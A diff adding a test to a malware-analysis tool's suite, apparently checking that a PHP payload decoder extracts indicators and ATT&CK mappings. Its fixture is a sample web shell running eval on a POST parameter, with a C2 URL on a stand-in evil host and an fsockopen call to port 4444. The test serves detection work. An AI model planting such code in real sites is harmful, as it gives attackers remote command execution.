@@ -48,6 +48,28 @@ def test_decode_payload_php_eval_base64():
     assert names[0] == "original"
     assert "inner" in names
     assert any("echo" in layer["text"] for layer in data["layers"])
+    assert "correlation" in data["report"]
+
+
+def test_decode_payload_collects_campaign_iocs():
+    src = """<?php
+eval($_POST["cmd"]);
+$u = "http://c2.evil.example/gate.php?id=7";
+$btc = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+$tg = "123456789:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+fsockopen("203.0.113.10", 4444);
+"""
+    data = decode_payload(src, lang="php", filename="shell.php")
+    assert data["ok"] is True
+    iocs = data["report"]["indicators"]
+    assert "c2.evil.example" in iocs["domains"]
+    assert any(w.startswith("btc:") for w in iocs["wallets"])
+    assert any("123456789:" in t for t in iocs["telegram"])
+    assert "POST:cmd" in iocs["request_params"]
+    corr = data["report"]["correlation"]
+    assert any(row["id"] == "T1505.003" for row in corr["attack"])
+    assert any(k.startswith("wallet:btc:") for k in corr["campaign_keys"])
+    assert any(k.startswith("param:POST:cmd") for k in corr["campaign_keys"])
 
 
 def test_decode_payload_rejects_empty():
